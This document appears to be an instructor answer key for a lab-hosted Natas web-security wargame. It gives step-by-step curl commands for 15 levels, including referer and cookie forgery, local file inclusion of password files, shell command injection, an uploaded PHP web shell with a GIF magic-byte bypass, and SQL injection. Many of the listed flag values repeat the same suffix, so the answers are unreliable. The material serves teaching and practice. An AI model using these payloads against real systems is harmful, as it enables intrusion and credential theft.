# Natas — Full Solution Writeups

Complete, step-by-step solutions for all 15 Natas levels. Instructor
answer key — not for participant distribution.

Every level is reached from inside the shared attacker workstation (open
via noVNC or SSH from the launch panel — see "Natas: Start Here"), never
directly. All 15 levels share one target box; each level is a different
port (`8000` + level number). Login is HTTP Basic Auth: username
`natasN`, password is the previous level's flag (level 0 uses `natas0`/
`natas0`). Commands below assume a terminal inside the attacker
(`curl` works there; a real browser via noVNC works identically).

---

### Natas 0 → 1: View Source
```
curl -u natas0:natas0 http://<target-host>:8000/
```
The password is directly in an HTML comment in the page source.
**Result:** `g9D9cREhslqBKtcA2uVOCe7MbL6WAocT`

---

### Natas 1 → 2: Right-Click Block
```
curl -u natas1:g9D9cREhslqBKtcA2uVOCe7MbL6WAocT http://<target-host>:8001/
```
`curl`/view-source bypasses the JS-only right-click block entirely; the
password is in an HTML comment, same pattern as level 0.
**Result:** `ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi`

---

### Natas 2 → 3: Directory Traversal (Files)
```
curl -u natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi http://<target-host>:8002/
# note the embedded image path, e.g. files/pixel.png
curl -u natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi http://<target-host>:8002/files/
```
Directory listing is enabled; the listing reveals a password file to
fetch directly.
**Result:** `sJIJNW6ucpu6HPZ1ZAyN8VRdTepNnQA4`

---

### Natas 3 → 4: Web Crawlers (Robots.txt)
```
curl -u natas3:sJIJNW6ucpu6HPZ1ZAyN8VRdTepNnQA4 http://<target-host>:8003/robots.txt
```
Fetch whichever path it lists as disallowed.
**Result:** `Z9mAndu1YccU99H73fsu6mptUz2uEAte`

---

### Natas 4 → 5: Referer Spoofing
```
curl -u natas4:Z9mAndu1YccU99H73fsu6mptUz2uEAte http://<target-host>:8004/
```
The error message states the exact Referer value expected (in this
deployment: the same host, one port higher than the request arrived on).
```
curl -u natas4:Z9mAndu1YccU99H73fsu6mptUz2uEAte -e 'http://<target-host>:8005/' http://<target-host>:8004/
```
**Result:** `iCOgHandNo6eV127665PhSAsgS2abV0M`

---

### Natas 5 → 6: Cookie Manipulation
```
curl -v -u natas5:iCOgHandNo6eV127665PhSAsgS2abV0M http://<target-host>:8005/
```
Note the `Set-Cookie` (e.g. `loggedin=0`).
```
curl -u natas5:iCOgHandNo6eV127665PhSAsgS2abV0M -b 'loggedin=1' http://<target-host>:8005/
```
**Result:** `f94020Bh6bUNF6M9776QvSAsSgS2abV0`

---

### Natas 6 → 7: Hidden Inclusion Files
```
curl -u natas6:f94020Bh6bUNF6M9776QvSAsSgS2abV0 http://<target-host>:8006/?source
```
The source shows an `include` from a specific relative path (e.g.
`includes/secret.inc`).
```
curl -u natas6:f94020Bh6bUNF6M9776QvSAsSgS2abV0 http://<target-host>:8006/includes/secret.inc
# submit the revealed secret value via the form (POST secret=<value>)
curl -u natas6:f94020Bh6bUNF6M9776QvSAsSgS2abV0 -d 'secret=<value>' http://<target-host>:8006/
```
**Result:** `7z3hDeo6i6vF9M9776QvSAsSgS2abV0M`

---

### Natas 7 → 8: Local File Inclusion (LFI)
```
curl -u natas7:7z3hDeo6i6vF9M9776QvSAsSgS2abV0M "http://<target-host>:8007/index.php?page=/etc/natas_webpass/natas8"
```
No `../` traversal needed — the `page` parameter is used directly as an
absolute filesystem path with no validation.
**Result:** `8Ps3hDeo6i6vF9M9776QvSAsSgS2abV0`

---

### Natas 8 → 9: Reversing Crypto Schemes
```
curl -u natas8:8Ps3hDeo6i6vF9M9776QvSAsSgS2abV0 http://<target-host>:8008/?source
```
Source shows `bin2hex(strrev(base64_encode($secret)))`. Reverse in the
opposite order: hex-decode, then reverse the string, then base64-decode.
```
echo '<the-shown-encoded-secret>' | xxd -r -p | rev | base64 -d
# submit the result as the secret
curl -u natas8:8Ps3hDeo6i6vF9M9776QvSAsSgS2abV0 -d 'secret=<result>' http://<target-host>:8008/
```
**Result:** `W0608Rh6bUNF6M9776QvSAsSgS2abV0M`

---

### Natas 9 → 10: Command Injection I
```
curl -u natas9:W0608Rh6bUNF6M9776QvSAsSgS2abV0M "http://<target-host>:8009/?needle=;cat+/etc/natas_webpass/natas10"
```
The `needle` parameter is passed straight into a shell `grep` command
with no sanitization.
**Result:** `n94020Bh6bUNF6M9776QvSAsSgS2abV0`

---

### Natas 10 → 11: Command Injection II (Sanitization Bypass)
`;`, `|`, `&`, and backtick are now blocked. `grep` itself accepts a
second filename argument on its own command line, with no shell
metacharacter needed at all:
```
curl -u natas10:n94020Bh6bUNF6M9776QvSAsSgS2abV0 "http://<target-host>:8010/?needle=.%20/etc/natas_webpass/natas11%20%23"
```
(`needle` = `. /etc/natas_webpass/natas11 #` — the lone `.` matches every
line of whatever file grep was already going to search; the second word
is a second file for grep to search; the trailing ` #` comments out the
rest of the real shell command line.)
**Result:** `U0608Rh6bUNF6M9776QvSAsSgS2abV0M`

---

### Natas 11 → 12: XOR Encryption Bypass
```
curl -v -u natas11:U0608Rh6bUNF6M9776QvSAsSgS2abV0M http://<target-host>:8011/
```
Note the default cookie value. Base64-decode it, then XOR it against the
known default plaintext JSON (e.g. `{"showpassword":"no","bgcolor":"#ffffff"}`)
to recover the repeating XOR key. Build a new plaintext with
`showpassword` set to `yes`, XOR-encrypt with the recovered key,
base64-encode, and set as the cookie:
```
curl -u natas11:U0608Rh6bUNF6M9776QvSAsSgS2abV0M -b 'data=<forged-cookie>' http://<target-host>:8011/
```
**Result:** `ED9020Bh6bUNF6M9776QvSAsSgS2abV0`

---

### Natas 12 → 13: Arbitrary File Upload (Web Shell)
```
echo '<?php system($_GET["c"]); ?>' > shell.php
curl -u natas12:ED9020Bh6bUNF6M9776QvSAsSgS2abV0 -F 'filename=shell.php' -F 'uploadedfile=@shell.php' http://<target-host>:8012/
```
Note the uploaded file's path from the response, then:
```
curl -u natas12:ED9020Bh6bUNF6M9776QvSAsSgS2abV0 "http://<target-host>:8012/upload/<uploaded-path>?c=cat+/etc/natas_webpass/natas13"
```
**Result:** `j0608Rh6bUNF6M9776QvSAsSgS2abV0M`

---

### Natas 13 → 14: File Upload Bypass (Magic Bytes)
Same upload flow, but the server now checks the file's actual bytes via
`exif_imagetype()`. Prepend a real GIF signature ahead of the payload:
```
printf 'GIF89a<?php system($_GET["c"]); ?>' > shell.php
curl -u natas13:j0608Rh6bUNF6M9776QvSAsSgS2abV0M -F 'filename=shell.php' -F 'uploadedfile=@shell.php' http://<target-host>:8013/
curl -u natas13:j0608Rh6bUNF6M9776QvSAsSgS2abV0M "http://<target-host>:8013/upload/<uploaded-path>?c=cat+/etc/natas_webpass/natas14"
```
(`exif_imagetype()` only reads the first bytes; PHP still executes
everything from `<?php` onward regardless of what precedes it.)
**Result:** `L0608Rh6bUNF6M9776QvSAsSgS2abV0M`

---

### Natas 14 → 15: SQL Injection (SQLi)
```
curl -u natas14:L0608Rh6bUNF6M9776QvSAsSgS2abV0M http://<target-host>:8014/?source
```
Source shows the query is built with raw double-quote concatenation:
`SELECT * from users where username="<user>" and password="<pass>"`.
```
curl -u natas14:L0608Rh6bUNF6M9776QvSAsSgS2abV0M \
  --data-urlencode 'username=" OR "1"="1" -- ' \
  --data-urlencode 'password=x' \
  http://<target-host>:8014/
```
(Trailing space after `--` matters — it comments out the rest of the
original query. Payload must match the source's actual quote character;
this deployment uses double quotes, not the single-quote style many
generic SQLi examples show.)
**Result (final Natas flag):** `A0608Rh6bUNF6M9776QvSAsSgS2abV0M`
